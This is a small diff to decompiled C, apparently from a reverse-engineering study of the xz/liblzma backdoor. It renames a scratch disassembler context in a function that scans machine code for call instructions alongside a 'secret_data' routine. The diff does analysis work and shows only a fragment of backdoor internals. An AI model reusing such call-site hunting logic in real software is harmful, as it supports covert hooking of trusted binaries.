@@ -19,19 +19,18 @@ BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_
   long lVar2;
   dasm_ctx_t *pdVar3;
   byte bVar4;
-  dasm_ctx_t ctx;
-  dasm_ctx_t local_80;
+  dasm_ctx_t scratch_ctx;
   
   bVar4 = 0;
   BVar1 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
   if (BVar1 != FALSE) {
-    pdVar3 = &local_80;
+    pdVar3 = &scratch_ctx;
     for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
       *(undefined4 *)&pdVar3->instruction = 0;
       pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
     }
     if (dctx == (dasm_ctx_t *)0x0) {
-      dctx = &local_80;
+      dctx = &scratch_ctx;
     }
     while (code_start < code_end) {
       BVar1 = x86_dasm(dctx,code_start,code_end);
